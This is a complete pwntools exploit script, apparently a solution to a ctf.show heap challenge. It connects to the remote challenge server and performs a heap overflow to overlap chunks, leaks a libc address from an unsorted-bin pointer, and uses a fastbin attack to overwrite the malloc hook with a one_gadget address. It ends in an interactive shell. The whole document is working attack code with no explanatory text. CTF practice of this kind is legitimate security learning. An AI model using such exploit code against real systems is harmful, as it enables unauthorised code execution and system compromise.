from pwn import *
context(arch='amd64',os='linux',log_level='debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28145)
elf = ELF('./pwn')
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
    
def Alloc(size):
    io.recvuntil('Command:')
    io.sendline('1')
    io.recvuntil('Size:')
    io.sendline(str(size))
    
def Fill(index,content):
    io.recvuntil('Command:')
    io.sendline('2')
    io.recvuntil('Index:')
    io.sendline(str(index))
    io.recvuntil('Size:')
    io.sendline(str(len(content)))
    io.recvuntil('Content:')
    io.send(content)
    
def Free(index):
    io.recvuntil('Command:')
    io.sendline('3')
    io.recvuntil('Index:')
    io.sendline(str(index))
    
def Dump(index):
    io.recvuntil('Command:')
    io.sendline('4')
    io.recvuntil('Index:')
    io.sendline(str(index))
    io.recvuntil('Content: \n')
    A = io.recvline()
    return A
Alloc(0x10)
Alloc(0x10)
Alloc(0x10)
Alloc(0x10)
Alloc(0x80)
Free(1)
Free(2)
padding = p64(0)*3 + p64(0x21)
payload = padding*2 + p8(0x80)
Fill(0, payload)
Fill(3, padding)
Alloc(0x10)
Alloc(0x10)
payload = p64(0)*3 + p64(0x91)
Fill(3, payload)
Alloc(0x80)
Free(4)
libc_base = u64(Dump(2)[:8].ljust(8, "\x00"))-0x3c4b78
print(hex(libc_base))
    
Alloc(0x60)
Free(4)
payload = p64(libc_base + 0x3c4aed)
Fill(2, payload)
Alloc(0x60)
Alloc(0x60)
one = libc_base + 0x4526a
payload = p8(0)*3 + p64(0)*2 + p64(one)
Fill(6, payload)
Alloc(0x10)
io.interactive()
